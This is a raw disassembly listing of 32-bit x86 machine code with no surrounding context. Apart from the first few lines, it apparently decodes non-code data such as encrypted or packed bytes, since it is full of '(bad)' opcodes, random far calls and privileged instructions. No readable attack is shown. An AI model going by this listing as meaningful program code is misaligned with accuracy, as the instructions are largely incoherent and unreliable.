  4060c4:	mov    edx,DWORD PTR [ebp-0xc]
  4060c7:	xor    eax,esi
  4060c9:	add    eax,edi
  4060cb:	imul   eax,edx
  4060ce:	mov    edx,DWORD PTR [ebp-0x8]
  4060d1:	jmp    0x408469
  4060d6:	leave  
  4060d7:	pop    es
  4060d8:	xchg   DWORD PTR ds:0x47490549,eax
  4060de:	(bad)  
  4060df:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4060e0:	or     bl,cl
  4060e2:	and    ax,0x1af3
  4060e6:	jno    0x4060a9
  4060e8:	jnp    0x406165
  4060ea:	hlt    
  4060eb:	pushf  
  4060ec:	jnp    0x406169
  4060ee:	and    DWORD PTR [eax-0x48],ebx
  4060f1:	jbe    0x40611f
  4060f3:	inc    eax
  4060f4:	fiadd  DWORD PTR [ecx]
  4060f6:	gs mov eax,0x504e6c06
  4060fc:	cld    
  4060fd:	push   esi
  4060fe:	ror    DWORD PTR [eax],1
  406100:	repnz jecxz 0x406129
  406103:	test   BYTE PTR [ecx+0x4cb595a4],ch
  406109:	inc    esi
  40610a:	add    BYTE PTR [ecx],bh
  40610c:	or     ebp,esp
  40610e:	ins    DWORD PTR es:[edi],dx
  40610f:	xchg   edx,eax
  406110:	mov    dl,0xd0
  406112:	and    DWORD PTR [esi],edi
  406114:	push   0x8561181b
  406119:	gs jo  0x406126
  40611c:	dec    esi
  40611d:	lea    eax,[ebx-0x42]
  406120:	cmp    dh,BYTE PTR [esi-0x4a]
  406123:	imul   ebp,ebx,0x36
  406126:	sub    edi,DWORD PTR ds:0x167848a2
  40612c:	sub    eax,0x94dfe75c
  406131:	gs retf 
  406133:	dec    ebp
  406134:	sub    al,0x68
  406136:	cmp    BYTE PTR [edi+0xa],bl
  406139:	imul   eax,DWORD PTR ds:0x48b44500,0xfffffff2
  406140:	inc    edi
  406141:	mul    BYTE PTR [esi-0x336b0ea7]
  406147:	je     0x406196
  406149:	outs   dx,DWORD PTR ds:[esi]
  40614a:	pop    edi
  40614b:	inc    eax
  40614c:	(bad)  
  40614d:	sti    
  40614e:	loop   0x4061ac
  406150:	add    ax,0x6885
  406154:	inc    ebx
  406155:	push   cs
  406156:	(bad)  
  406158:	push   ds
  406159:	clc    
  40615a:	fcmovnb st,st(7)
  40615c:	push   ss
  40615d:	test   DWORD PTR [ebx+0x3b42c1d6],ebp
  406163:	sbb    cl,bl
  406165:	sbb    BYTE PTR [esi-0x5b],dl
  406168:	(bad)  
  406169:	or     al,0x5f
  40616b:	aas    
  40616c:	jmp    0x406100
  40616e:	int3   
  40616f:	out    dx,eax
  406170:	fisttp WORD PTR [ebx-0xbe970fa]
  406176:	loope  0x4061da
  406178:	xchg   DWORD PTR [edi],ebx
  40617a:	bound  ecx,QWORD PTR [edi]
  40617c:	call   0x7a71:0xb789092f
  406183:	mov    ah,0x38
  406185:	bound  esi,QWORD PTR [ebx+0x2e]
  406188:	adc    ebx,DWORD PTR [edi+0x53]
  40618b:	aam    0xe3
  40618d:	fnstsw WORD PTR [edi+0x51]
  406190:	pusha  
  406191:	push   eax
  406192:	xor    al,0xc5
  406194:	inc    ebx
  406195:	inc    ebx
  406196:	inc    edi
  406197:	sub    dh,dl
  406199:	adc    DWORD PTR [ebp-0x7f348c9],esi
  40619f:	pop    ds
  4061a0:	leave  
  4061a1:	inc    ebx
  4061a2:	popa   
  4061a3:	add    edx,DWORD PTR ds:0xf9363339
  4061a9:	cli    
  4061aa:	repz mov WORD PTR [edi],ds
  4061ad:	cmp    al,0x6f
  4061af:	test   eax,0x93fc6052
  4061b4:	jp     0x406152
  4061b6:	cs repz push cs
  4061b9:	in     al,0x99
  4061bb:	lds    ecx,FWORD PTR [edx-0x10]
  4061be:	cwde   
  4061bf:	inc    ebp
  4061c0:	cli    
  4061c1:	nop
  4061c2:	or     bh,BYTE PTR [edi+edx*4-0x204a178d]
  4061c9:	dec    edi
  4061ca:	out    0x97,eax
  4061cc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4061cd:	leave  
  4061ce:	enter  0xd955,0xf0
  4061d2:	loope  0x406230
  4061d4:	pop    es
  4061d5:	jp     0x4061fa
  4061d7:	cdq    
  4061d8:	mov    esi,0xbb89e7f4
  4061dd:	or     ah,BYTE PTR [ecx+0x41044088]
  4061e3:	fucomp st(3)
  4061e5:	sub    ebp,DWORD PTR [ebx-0x31]
  4061e8:	xor    bl,dl
  4061ea:	in     eax,0x1d
  4061ec:	inc    ecx
  4061ed:	and    BYTE PTR [eax+0x18],ah
  4061f0:	fidivr DWORD PTR [edi-0x310b04fd]
  4061f6:	mov    edi,0xb26fb74f
  4061fb:	std    
  4061fc:	rol    DWORD PTR [edx+ebp*8],0x70
  406200:	mov    ah,0xa1
  406202:	jo     0x4061da
  406204:	outs   dx,BYTE PTR ds:[esi]
  406205:	add    cl,BYTE PTR [edx]
  406207:	xor    eax,0x336da462
  40620c:	stos   BYTE PTR es:[edi],al
  40620d:	or     al,0x93
  40620f:	and    eax,DWORD PTR cs:[esi+0x0]
  406213:	cmp    dl,BYTE PTR [edi-0x2c]
  406216:	jmp    FWORD PTR [ebx-0x2]
  406219:	stc    
  40621a:	mov    eax,ds:0x1f5efbe4
  40621f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406220:	add    eax,0xd2df7b66
  406225:	cld    
  406226:	xor    eax,0xc2be2811
  40622b:	scas   al,BYTE PTR es:[edi]
  40622c:	xor    bl,ah
  40622e:	mov    BYTE PTR [eax],bl
  406230:	sub    eax,DWORD PTR [edi]
  406232:	stos   DWORD PTR es:[edi],eax
  406233:	cld    
  406234:	mov    esi,0x56f895c8
  406239:	mov    eax,0x19357100
  40623e:	cmc    
  40623f:	fld    QWORD PTR [ecx]
  406241:	jecxz  0x4061ea
  406243:	push   es
  406244:	pop    esi
  406245:	pop    ebp
  406246:	inc    edi
  406247:	enter  0x4074,0xed
  40624b:	hlt    
  40624c:	stc    
  40624d:	cmp    esp,DWORD PTR [esi+ebx*8]
  406250:	mov    ebx,DWORD PTR [eax+0x1a]
  406253:	das    
  406254:	neg    eax
  406256:	fcmovnu st,st(5)
  406258:	mov    ecx,eax
  40625a:	aaa    
  40625b:	aaa    
  40625c:	mov    ecx,0x5ec92e4
  406261:	mov    dl,0xd9
  406263:	sbb    al,0xef
  406265:	push   cs
  406266:	loope  0x406240
  406268:	push   cs
  406269:	sahf   
  40626a:	cli    
  40626b:	mov    ds:0x5146c9ee,eax
  406270:	addr16 xor al,0xab
  406273:	jle    0x40628c
  406275:	xchg   esi,eax
  406276:	jmp    0x40625a
  406278:	(bad)  
  406279:	call   0xd846:0xef6314be
  406280:	mov    dl,0x60
  406282:	popa   
  406283:	jo     0x4062e7
  406285:	fstp   QWORD PTR [esi+ebx*2+0x3]
  406289:	ret    
  40628a:	add    DWORD PTR [edx-0x22],ebx
  40628d:	push   ds
  40628e:	ret    
  40628f:	(bad)  
  406290:	push   esp
  406291:	lds    eax,FWORD PTR ds:0x6ce3e7b9
  406297:	push   edi
  406298:	or     eax,0xaf69806a
  40629d:	cmp    bh,BYTE PTR [edx]
  40629f:	and    eax,0xcbafc648
  4062a4:	repz iret 
  4062a6:	inc    ecx
  4062a7:	pop    ebp
  4062a8:	out    dx,eax
  4062a9:	xchg   edx,eax
  4062aa:	push   ds
  4062ab:	pop    ss
  4062ac:	aaa    
  4062ad:	dec    ebx
  4062ae:	push   ebx
  4062af:	mov    esi,0x506fa26f
  4062b4:	lea    edi,[edi+0x5]
  4062b7:	xchg   edi,eax
  4062b8:	xchg   BYTE PTR [ebp-0x38779b76],ch
  4062be:	add    al,0xd9
  4062c0:	inc    esp
  4062c1:	hlt    
  4062c2:	sub    BYTE PTR [ebx-0x672150e8],dl
  4062c8:	fwait
  4062c9:	pop    eax
  4062ca:	push   eax
  4062cb:	sub    DWORD PTR [ebp+0x5fa46f23],ebp
  4062d1:	sbb    BYTE PTR [edx-0x5736e99],bl
  4062d7:	icebp  
  4062d8:	repnz xchg ebx,eax
  4062da:	pop    esp
  4062db:	mov    ch,0x9a
  4062dd:	mov    edi,0xc305213b
  4062e2:	mov    di,0x2ff2
  4062e6:	in     al,0xd1
  4062e8:	xchg   esi,eax
  4062e9:	ja     0x40635a
  4062eb:	push   edi
  4062ec:	sub    BYTE PTR [ebx],0x5
  4062ef:	or     eax,0x9955cfea
  4062f4:	mov    edi,0x2fd2b4a7
  4062f9:	int3   
  4062fa:	or     DWORD PTR [eax-0x67f3f47c],edi
  406300:	mov    dh,0x90
  406302:	push   ebp
  406303:	lahf   
  406304:	jg     0x406314
  406306:	cmp    BYTE PTR [edi],dh
  406308:	add    BYTE PTR [esp+ebp*8-0x581fa964],0x1f
  406310:	out    0x4f,al
  406312:	mov    BYTE PTR [ecx+0x5f75bb67],dh
  406318:	add    esp,DWORD PTR [eax+0x46]
  40631b:	pop    edi
  40631c:	data16 repnz sti 
  40631f:	xor    esp,DWORD PTR ds:0xafdcc78f
  406325:	mov    dh,0x1c
  406327:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406328:	xchg   edi,eax
  406329:	or     BYTE PTR [ebx-0x41554815],bl
  40632f:	xchg   BYTE PTR ds:0x50241c09,dh
  406335:	inc    ebp
  406336:	add    eax,0x9f91e5f4
  40633b:	es lahf 
  40633d:	js     0x4062c2
  40633f:	mov    al,0xa1
  406341:	into   
  406342:	mov    ecx,0xe611192b
  406347:	push   0x66
  406349:	repnz repz (bad) ds:0x49b2e68e
  406351:	jne    0x406318
  406353:	popa   
  406354:	jge    0x40630f
  406356:	pop    esi
  406357:	int3   
  406358:	mov    ds:0x72e684a8,eax
  40635d:	mov    ebx,0x70afbccd
  406362:	add    ebx,DWORD PTR [esi-0x4e]
  406365:	(bad)  
  406367:	xchg   BYTE PTR [esi+eax*1-0x4e],al
  40636b:	mov    BYTE PTR [eax+0x43d552b],al
  406371:	dec    esi
  406372:	cli    
  406373:	pop    gs
  406375:	lahf   
  406376:	push   edx
  406377:	jmp    0x406359
  406379:	iret   
  40637a:	dec    esp
  40637b:	jg     0x406338
  40637d:	xchg   ebx,eax
  40637e:	(bad)  
  406380:	xor    al,0x5c
  406382:	mov    dl,bh
  406384:	or     DWORD PTR [esi+ebx*8+0x55],ebp
  406388:	cmp    ebx,DWORD PTR [edi]
  40638a:	sub    eax,0x72d82409
  40638f:	ins    BYTE PTR es:[edi],dx
  406390:	loope  0x406376
  406392:	xor    al,0xd8
  406394:	xor    BYTE PTR [edx-0x51],bl
  406397:	pusha  
  406398:	call   0x80ac:0x2aa61e02
  40639f:	out    0x78,al
  4063a1:	pop    edx
  4063a2:	push   ecx
  4063a3:	xlat   BYTE PTR ds:[ebx]
  4063a4:	mov    al,ds:0x2a5f35f7
  4063a9:	fdivp  st(5),st
  4063ab:	lea    esp,[esi]
  4063ad:	repz mov dl,BYTE PTR [ecx+0x62]
  4063b1:	and    esp,0xffffff85
  4063b4:	leave  
  4063b5:	pop    edi
  4063b6:	add    eax,0x95532962
  4063bb:	scas   eax,DWORD PTR es:[edi]
  4063bc:	jno    0x4063a8
  4063be:	pop    esp
  4063bf:	ss sub eax,0xb1421345
  4063c5:	das    
  4063c6:	mov    eax,ds:0xcca41c60
  4063cb:	mov    ss,WORD PTR [edx+0x71]
  4063ce:	call   0xcbfc95b4
  4063d3:	(bad)  
  4063d4:	leave  
  4063d5:	loop   0x406441
  4063d7:	cmp    DWORD PTR [edi-0x232c5782],eax
  4063dd:	mov    edi,0xa5e8b685
  4063e2:	push   0xd8c15ac2
  4063e7:	adc    bh,bl
  4063e9:	les    edi,FWORD PTR [edi+0x77]
  4063ec:	xor    edi,DWORD PTR [ecx-0x27]
  4063ef:	icebp  
  4063f0:	out    0x14,al
  4063f2:	fsub   DWORD PTR [edx]
  4063f4:	cmp    eax,ebx
  4063f6:	jae    0x406399
  4063f8:	cmp    BYTE PTR [esi+0x7],ah
  4063fb:	mov    WORD PTR [esp+ebp*1-0x57e9c0e],es
  406402:	jp     0x40645a
  406404:	rcl    BYTE PTR [edi+eax*2+0x18],1
  406408:	scas   eax,DWORD PTR es:[edi]
  406409:	and    BYTE PTR [ebp+0x39bee0bc],dl
  40640f:	sbb    cl,BYTE PTR [edx+0x799d30ca]
  406415:	and    eax,0x587c11b
  40641a:	push   edx
  40641b:	sub    dl,BYTE PTR [edx-0x23099a61]
  406421:	and    ah,al
  406423:	stos   DWORD PTR es:[edi],eax
  406424:	mov    edx,0x3e114c
  406429:	(bad)  
  40642a:	lds    edx,FWORD PTR [ebx]
  40642c:	pop    es
  40642d:	hlt    
  40642e:	(bad)  
  40642f:	mov    eax,ds:0x7464d67e
  406434:	sbb    al,0x16
  406436:	into   
  406437:	das    
  406438:	in     al,0xce
  40643a:	fwait
  40643b:	shr    BYTE PTR [edi],1
  40643d:	aas    
  40643e:	mov    ah,0x48
  406440:	or     eax,0xce4cae2a
  406445:	(bad)  
  406446:	sar    BYTE PTR [esi],0x5f
  406449:	mov    ah,0xa1
  40644b:	pop    edi
  40644c:	mov    ds:0xff989782,al
  406451:	push   edi
  406452:	xchg   esi,eax
  406453:	mov    bl,0x54
  406455:	(bad)  
  406457:	dec    dx
  406459:	mov    dl,0x95
  40645b:	mov    bh,0x7f
  40645d:	imul   esp,DWORD PTR [esi],0xffffffdb
  406460:	mov    esp,0x7a46a8e5
  406465:	add    ecx,0x29f9e165
  40646b:	bound  ecx,QWORD PTR [ecx]
  40646d:	jmp    0x406478
  40646f:	popf   
  406470:	mov    ds:0x6a94ef35,al
  406475:	sbb    al,0xf4
  406477:	faddp  st(1),st
  406479:	xchg   ecx,eax
  40647a:	sub    DWORD PTR [ebx],0xb34fcea6
  406480:	and    al,0xd3
  406482:	retf   
  406483:	jecxz  0x40648c
  406485:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406486:	or     ebx,esp
  406488:	sbb    eax,0xadf146a2
  40648d:	sub    esi,DWORD PTR [ecx+0x6d]
  406490:	and    al,0xb2
  406492:	out    dx,al
  406493:	sub    DWORD PTR [eax-0x749505a4],ecx
  406499:	aad    0x51
  40649b:	pop    ss
  40649c:	iret   
  40649d:	nop
  40649e:	lahf   
  40649f:	mov    DWORD PTR [esi],ecx
  4064a1:	pop    ecx
  4064a2:	test   BYTE PTR [eax],bh
  4064a4:	fs inc ebx
  4064a6:	daa    
  4064a7:	mov    al,al
  4064a9:	iret   
  4064aa:	sbb    eax,0x4e
  4064ad:	loopne 0x4064a4
  4064af:	(bad)  
  4064b0:	sub    eax,eax
  4064b2:	popf   
  4064b3:	enter  0xe880,0xd6
  4064b7:	mov    bh,0x5
  4064b9:	cmc    
  4064ba:	mov    bl,0x48
  4064bc:	(bad)  
  4064be:	inc    edx
  4064bf:	sub    ebx,DWORD PTR [ecx]
  4064c1:	xchg   ebx,eax
  4064c2:	mov    ds:0xf52eff62,al
  4064c7:	fist   DWORD PTR [ecx-0x60]
  4064ca:	out    dx,eax
  4064cb:	nop
  4064cc:	aas    
  4064cd:	add    DWORD PTR [edx+0x50],0xe
  4064d1:	bound  ebx,QWORD PTR [ecx-0x38947c74]
  4064d7:	xor    al,0x25
  4064d9:	cmp    eax,0xb74d417b
  4064de:	xor    eax,0xf6e09bc0
  4064e3:	call   0xe4ed7f86
  4064e8:	popa   
  4064e9:	mov    esi,0xe11367bd
  4064ee:	mov    bl,cl
  4064f0:	pop    ecx
  4064f1:	icebp  
  4064f2:	leave  
  4064f3:	xor    al,0xb
  4064f5:	push   0x1d
  4064f7:	xchg   ebp,eax
  4064f8:	mov    DWORD PTR [ecx+0x48],ebx
  4064fb:	xchg   DWORD PTR [ecx+eiz*8],edx
  4064fe:	jl     0x4064ca
  406500:	out    dx,eax
  406501:	xchg   esi,eax
  406502:	and    DWORD PTR [edx+0x12],esi
  406505:	sbb    al,0xff
  406507:	test   DWORD PTR [eax+0x1f86a69f],esp
  40650d:	add    cl,BYTE PTR [esi]
  40650f:	rol    BYTE PTR [eax-0x58],0xbd
  406513:	xchg   ebp,eax
  406514:	xchg   ebx,eax
  406515:	(bad)  
  406516:	add    eax,0x6734fdcb
  40651b:	inc    ebp
  40651c:	add    eax,esi
  40651e:	aam    0x1a
  406520:	scas   al,BYTE PTR es:[edi]
  406521:	(bad)  
  406522:	ret    0x47aa
  406525:	mov    edx,0xfa1dbd52
  40652a:	fidivr WORD PTR [edi-0x15a86b5d]
  406530:	sub    al,cl
  406532:	inc    esp
  406533:	cmp    ah,BYTE PTR [ecx+0x12]
  406536:	or     BYTE PTR [edx-0x4c6a5134],0x5
  40653d:	in     al,dx
  40653e:	pop    eax
  40653f:	dec    esp
  406540:	fisub  DWORD PTR [ecx+eax*1]
  406543:	clc    
  406544:	ret    0x4277
  406547:	xor    BYTE PTR [edx],ah
  406549:	adc    dh,BYTE PTR [ebx-0x50ff4bbf]
  40654f:	retf   
  406550:	push   ecx
  406551:	lock push es
  406553:	push   edx
  406554:	and    BYTE PTR [edi],dl
  406556:	pop    eax
  406557:	sub    BYTE PTR [eax-0x47],bl
  40655a:	cli    
  40655b:	push   0x83e87582
  406560:	xchg   ebx,eax
  406561:	sub    esi,edx
  406563:	ja     0x406576
  406565:	cmp    ch,BYTE PTR [ecx]
  406567:	mov    WORD PTR [edi],ds
  406569:	and    DWORD PTR [edx+ebx*1+0x3e2a937d],0xffffff8f
  406571:	cli    
  406572:	xor    al,0x36
  406574:	or     BYTE PTR [esi+ecx*4],cl
  406577:	inc    ebx
  406578:	push   esi
  406579:	adc    BYTE PTR [eax+0x2d],0xcf
  40657d:	cmp    cl,BYTE PTR [edi+0x1c50bf77]
  406583:	rcr    BYTE PTR [edi],cl
  406585:	stc    
  406586:	scas   eax,DWORD PTR es:[edi]
  406587:	js     0x4065f4
  406589:	mov    ds,WORD PTR [ecx]
  40658b:	mov    ecx,0xe27b7285
  406590:	rol    bl,1
  406592:	mov    eax,0x5fa25316
  406597:	fidiv  DWORD PTR [eax]
  406599:	jecxz  0x406529
  40659b:	xor    BYTE PTR [eax-0x6a],dh
  40659e:	dec    esp
  40659f:	sub    BYTE PTR [eax+0x65bb72b4],dh
  4065a5:	add    eax,0x11b4f1b6
  4065aa:	xchg   edi,eax
  4065ab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4065ac:	adc    al,0x28
  4065ae:	fs jo  0x4065a2
  4065b1:	fidiv  WORD PTR [ebp+0x28e0ac36]
  4065b7:	icebp  
  4065b8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4065b9:	push   edi
  4065ba:	jmp    0xc6401818
  4065bf:	jmp    0x1f0a:0x9ed0d85d
  4065c6:	icebp  
  4065c7:	jb     0x406553
  4065c9:	xor    eax,0xb9806ca0
  4065ce:	push   esp
  4065cf:	xchg   ebx,eax
  4065d0:	stos   BYTE PTR es:[edi],al
  4065d1:	jecxz  0x4065c4
  4065d3:	mov    eax,0x2dd09ea4
  4065d8:	addr16 out dx,eax
  4065da:	or     BYTE PTR [esi+0x6b],al
  4065dd:	pop    esp
  4065de:	adc    DWORD PTR [ecx+0x2e],0x7a
  4065e2:	iret   
  4065e3:	ds ror eax,cl
  4065e6:	test   BYTE PTR [ecx-0x33],0x86
  4065ea:	xchg   esi,eax
  4065eb:	(bad)  
  4065ec:	push   ss
  4065ed:	(bad)  
  4065ee:	jl     0x40662e
  4065f0:	adc    al,0xa8
  4065f2:	cmp    esi,esp
  4065f4:	jp     0x4065aa
  4065f6:	push   ebx
  4065f7:	jp     0x406669
  4065f9:	pop    esp
  4065fa:	push   ss
  4065fb:	ror    DWORD PTR [esp+esi*8-0x56],0xf0
  406600:	fadd   DWORD PTR [ecx+0x5a]
  406603:	jp     0x406592
  406605:	in     eax,0x1b
  406607:	int3   
  406608:	add    al,0xff
  40660a:	call   0x700a:0x27bd8c98
  406611:	adc    DWORD PTR [edx],edi
  406613:	leave  
  406614:	jo     0x4065cc
  406616:	xor    eax,ecx
  406618:	gs out dx,eax
  40661a:	fsubp  st(4),st
  40661c:	xchg   ebp,eax
  40661d:	xchg   esp,eax
  40661e:	retf   
  40661f:	iret   
  406620:	das    
  406621:	test   BYTE PTR [edi+eax*2+0x15],dh
  406625:	aam    0xbf
  406627:	pop    esi
  406628:	loopne 0x4065e0
  40662a:	mov    ch,0xdb
  40662c:	lods   al,BYTE PTR ds:[esi]
  40662d:	xchg   ebp,eax
  40662e:	push   ss
  40662f:	or     DWORD PTR [edi+0x1a],0x44
  406633:	mov    eax,ds:0xf469c0
  406638:	(bad)  
  406639:	aam    0x1a
  40663b:	in     al,dx
  40663c:	ins    DWORD PTR es:[edi],dx
  40663d:	sub    edx,DWORD PTR [ebp+edi*4+0x694441ea]
  406644:	repz xchg edx,eax
  406646:	call   0xbf2047d8
  40664b:	nop
  40664c:	aam    0x6c
  40664e:	iret   
  40664f:	inc    ebp
  406650:	xor    BYTE PTR [esi-0x6d],ah
  406653:	pop    edi
  406654:	sbb    BYTE PTR fs:[esi],dh
  406657:	pop    es
  406658:	in     al,dx
  406659:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40665a:	lods   al,BYTE PTR ds:[esi]
  40665b:	pop    esp
  40665c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40665d:	idiv   BYTE PTR [ebx]
  40665f:	mov    eax,0x63b621fb
  406664:	(bad)  
  406665:	loopne 0x40666d
  406667:	test   eax,0xe95c95f8
  40666c:	js     0x406633
  40666e:	add    eax,0x6e9d45b1
  406673:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406674:	hlt    
  406675:	popf   
  406676:	inc    ecx
  406677:	fmul   DWORD PTR [ecx-0x304d7de6]
  40667d:	mov    edi,0x3f93752d
  406682:	(bad)  
  406683:	pop    edx
  406684:	push   es
  406685:	mov    ds,WORD PTR [esi-0x4b]
  406688:	lea    ebx,[edi]
  40668a:	jg     0x406648
  40668c:	add    eax,0x6ee68487
  406691:	pop    esp
  406692:	sti    
  406693:	into   
  406694:	ins    DWORD PTR es:[edi],dx
  406695:	(bad)  
  406696:	cs cld 
  406698:	push   ss
  406699:	mov    esp,0x1abbc8d5
  40669e:	add    al,0x20
  4066a0:	(bad)  [eax-0x6d459af9]
  4066a6:	mov    DWORD PTR [edx],esi
  4066a8:	sub    DWORD PTR [ecx-0xaf04121],eax
  4066ae:	pusha  
  4066af:	cwde   
  4066b0:	aas    
  4066b1:	inc    esi
  4066b2:	jmp    0x403d:0x4469386d
  4066b9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4066ba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4066bb:	(bad)  
  4066bc:	icebp  
  4066bd:	and    dh,dl
  4066bf:	mov    dh,0xd0
  4066c1:	ret    0x67ca
  4066c4:	lea    ecx,[esi+0x5039c13a]
  4066ca:	dec    DWORD PTR [ebx]
  4066cc:	pop    edi
  4066cd:	test   DWORD PTR [ecx],edi
  4066cf:	inc    ebx
  4066d0:	cwde   
  4066d1:	mov    bh,0xf9
  4066d3:	push   eax
  4066d4:	arpl   bx,si
  4066d6:	scas   eax,DWORD PTR es:[edi]
  4066d7:	mov    eax,ds:0x8d8fae43
  4066dc:	clc    
  4066dd:	jae    0x406700
  4066df:	ret    0xa00e
  4066e2:	push   edi
  4066e3:	sub    edx,DWORD PTR [ecx+0x2]
  4066e6:	dec    esi
  4066e7:	jmp    0x5621:0xf198792f
  4066ee:	inc    ecx
  4066ef:	push   0xffffff81
  4066f1:	mov    edi,0x9e7ad5e8
  4066f6:	clc    
  4066f7:	out    0x9c,al
  4066f9:	pusha  
  4066fa:	aam    0x44
  4066fc:	sub    BYTE PTR [ebx],bl
  4066fe:	out    0xac,al
  406700:	sbb    ch,BYTE PTR [ebx]
  406702:	int3   
  406703:	jp     0x406734
  406705:	push   0x3b
  406707:	ins    BYTE PTR es:[edi],dx
  406708:	data16 in al,dx
  40670a:	mov    BYTE PTR [eax],ch
  40670c:	add    edx,edx
  40670e:	or     eax,0x6ba52162
  406713:	into   
  406714:	pop    eax
  406715:	mov    cl,BYTE PTR [eax]
  406717:	mov    al,ds:0x9a73593
  40671c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40671d:	mov    dh,0x2b
  40671f:	sbb    ecx,DWORD PTR [edx]
  406721:	sub    edx,DWORD PTR [ecx-0xe]
  406724:	jle    0x4066c6
  406726:	sub    edi,DWORD PTR [esi]
  406728:	mov    edi,0x70cfb62e
  40672d:	out    dx,al
  40672e:	mov    ebp,0x5e473b8b
  406733:	mov    bl,0xaf
  406735:	add    bh,cl
  406737:	es sbb al,0xba
  40673a:	cmp    eax,0x50b5eba5
  40673f:	add    cl,BYTE PTR [edx+eax*1]
  406742:	sbb    eax,0x2c5b9bec
  406747:	dec    ecx
  406748:	dec    ebx
  406749:	iret   
  40674a:	out    dx,al
  40674b:	shr    BYTE PTR [esi+0x45],0xa0
  40674f:	cmp    al,0x28
  406751:	mov    dl,0x9f
  406753:	cmp    BYTE PTR [ebx-0xf394e22],ch
  406759:	test   al,0xaf
  40675b:	jb     0x40679d
  40675d:	jmp    0xe1204247
  406762:	jo     0x4067e2
  406764:	jp     0x406731
  406766:	mov    cs,WORD PTR [esi-0x1fb701cf]
  40676c:	cs push 0xffffffe7
  40676f:	mov    ds:0x548d5e02,eax
  406774:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406775:	push   ds
  406776:	push   ss
  406777:	cmc    
  406778:	sbb    BYTE PTR [ebp-0x5fd63b01],bl
  40677e:	xlat   BYTE PTR ds:[ebx]
  40677f:	cmp    ch,BYTE PTR [ecx-0x28]
  406782:	sahf   
  406783:	pop    ecx
  406784:	push   esi
  406785:	call   0x9898:0xe6150496
  40678c:	mov    ebp,0x6a86cc15
  406791:	add    DWORD PTR [eax+0x3a3fde7c],edi
  406797:	and    al,0x9b
  406799:	popa   
  40679a:	int3   
  40679b:	xchg   ecx,eax
  40679c:	loope  0x4067a8
  40679e:	cmp    eax,0xd19adca2
  4067a3:	repnz in al,dx
  4067a5:	xchg   esi,eax
  4067a6:	ror    bh,cl
  4067a8:	mov    ecx,0xbebfcb0
  4067ad:	sbb    DWORD PTR [edx-0x28],esp
  4067b0:	std    
  4067b1:	repz dec edx
  4067b3:	and    DWORD PTR [ebx],esi
  4067b5:	scas   al,BYTE PTR es:[edi]
  4067b6:	std    
  4067b7:	in     al,0x9b
  4067b9:	adc    al,BYTE PTR [edi-0x5a]
  4067bc:	jns    0x4067b1
  4067be:	add    cl,BYTE PTR [ecx]
  4067c0:	mov    al,ds:0x7e45cd15
  4067c5:	pop    eax
  4067c6:	add    DWORD PTR [edx],0x26
  4067c9:	jmp    0x40678e
  4067cb:	jp     0x4067e3
  4067cd:	mov    ch,0x70
  4067cf:	pop    edx
  4067d0:	jb     0x40678d
  4067d2:	ins    DWORD PTR es:[edi],dx
  4067d3:	mov    ah,BYTE PTR [ecx+0x30]
  4067d6:	pop    ecx
  4067d7:	je     0x406798
  4067d9:	jns    0x4067be
  4067db:	sub    dl,dh
  4067dd:	or     BYTE PTR [edx+0x3c6990f3],ah
  4067e3:	jbe    0x406856
  4067e5:	ror    DWORD PTR [edi],1
  4067e7:	test   eax,0x4105031f
  4067ec:	jmp    0x62afb69b
  4067f1:	inc    edi
  4067f2:	ss int3 
  4067f4:	mov    esi,0xaae7eb25
  4067f9:	adc    edx,edi
  4067fb:	add    al,0x27
  4067fd:	mov    esi,0x85fdf13e
  406802:	pop    ss
  406803:	test   ch,ah
  406805:	mov    dl,0x97
  406807:	test   BYTE PTR [eax-0x56],dl
  40680a:	add    BYTE PTR [edx],ch
  40680c:	(bad)  
  40680d:	les    esi,FWORD PTR [eax+0x39]
  406810:	jae    0x406869
  406812:	jbe    0x40683f
  406814:	sub    edi,esp
  406816:	mov    al,ds:0x8f1e921
  40681b:	imul   ebx,DWORD PTR [eax-0xe552344],0xda671dd6
  406825:	or     ebp,ebx
  406827:	das    
  406828:	push   0x212753d5
  40682d:	xchg   edi,eax
  40682e:	and    bh,bl
  406830:	aaa    
  406831:	and    eax,0xc8890b30
  406836:	and    eax,DWORD PTR [edx+edx*8+0x3c]
  40683a:	je     0x4067dd
  40683c:	repnz mov DWORD PTR [ecx-0x47],0x75af733b
  406844:	test   DWORD PTR [edi-0x1462d15a],0x54c94c20
  40684e:	mov    edi,0x5f57e3c1
  406853:	dec    esi
  406854:	call   0x7e3eb86
  406859:	xor    BYTE PTR [esp+eiz*4],0x7f
  40685d:	lods   al,BYTE PTR ds:[esi]
  40685e:	mov    ah,0x3d
  406860:	fdivr  DWORD PTR ss:[edi+ebx*1]
  406864:	lods   al,BYTE PTR ds:[esi]
  406865:	test   BYTE PTR [esi-0x5ba8e1a5],0x2f
  40686c:	jnp    0x406854
  40686e:	xchg   esp,eax
  40686f:	call   DWORD PTR [ecx+eax*2+0x4d]
  406873:	inc    ebx
  406874:	adc    eax,0x8d8001d4
  406879:	dec    ebp
  40687a:	pop    es
  40687b:	add    al,0x7e
  40687d:	popf   
  40687e:	aad    0xb4
  406880:	mov    bl,0x72
  406882:	scas   eax,DWORD PTR es:[edi]
  406883:	aad    0x12
  406885:	into   
  406886:	in     eax,0x42
  406888:	mov    edi,0xc8ff141a
  40688d:	das    
  40688e:	push   edx
  40688f:	je     0x406886
  406891:	sahf   
  406892:	mov    ebp,0x6f7bdfd
  406897:	rcr    DWORD PTR [ecx],0xd
  40689a:	outs   dx,DWORD PTR ds:[esi]
  40689b:	std    
  40689c:	ret    
  40689d:	icebp  
  40689e:	push   ecx
  40689f:	add    dh,BYTE PTR [edx+ebx*4-0x23e0b0b6]
  4068a6:	outs   dx,BYTE PTR ds:[esi]
